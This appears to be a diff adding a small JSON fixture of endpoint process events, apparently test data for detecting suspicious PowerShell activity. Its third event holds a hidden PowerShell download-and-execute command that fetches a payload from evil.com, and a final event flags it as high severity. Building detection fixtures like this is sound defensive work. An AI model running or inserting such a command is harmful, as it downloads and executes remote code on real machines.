@@ -1,0 +1,4 @@
+{"#event_simpleName": "ProcessRollup2", "TargetProcessId": "1001", "ParentProcessId": "1000", "ImageFileName": "svchost.exe", "CommandLine": "svchost.exe -k netsvcs", "UserName": "SYSTEM"}
+{"#event_simpleName": "ProcessRollup2", "TargetProcessId": "1002", "ParentProcessId": "1001", "ImageFileName": "cmd.exe", "CommandLine": "cmd.exe /c whoami", "UserName": "SYSTEM"}
+{"#event_simpleName": "ProcessRollup2", "TargetProcessId": "1003", "ParentProcessId": "1002", "ImageFileName": "powershell.exe", "CommandLine": "powershell.exe -w hidden -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/payload\")'", "UserName": "user$"}
+{"#event_simpleName": "AssociateIndicator", "TargetProcessId": "1003", "DetectName": "Suspicious PowerShell", "DetectSeverity": "High", "timestamp": "123456789"}
